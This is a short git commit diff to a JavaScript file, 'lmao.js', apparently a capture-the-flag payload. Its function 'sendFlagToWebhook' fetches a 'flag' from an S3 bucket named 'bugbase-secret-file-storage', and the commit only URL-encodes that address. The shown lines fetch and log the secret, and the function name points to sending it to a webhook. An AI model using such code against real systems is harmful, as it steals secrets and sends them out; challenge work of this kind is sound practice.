acc56a225e9475062d62d99ce1a0624c62113f7a
Harshit Sharma <35893312+hs414171@users.noreply.github.com>
2023-04-28 19:12:03 +0530

    Update lmao.js

--- lmao.js
+++ lmao.js
@@ -1,6 +1,6 @@
 async function sendFlagToWebhook(webhookUrl) {
   try {
-    const response = await fetch('https://bugbase-secret-file-storage.s3.ap-northeast-2.amazonaws.com/flag');
+    const response = await fetch('https%3A%2F%2Fbugbase-secret-file-storage.s3.ap-northeast-2.amazonaws.com%2Fflag');
     const data = await response.text();
     console.log(data);
 
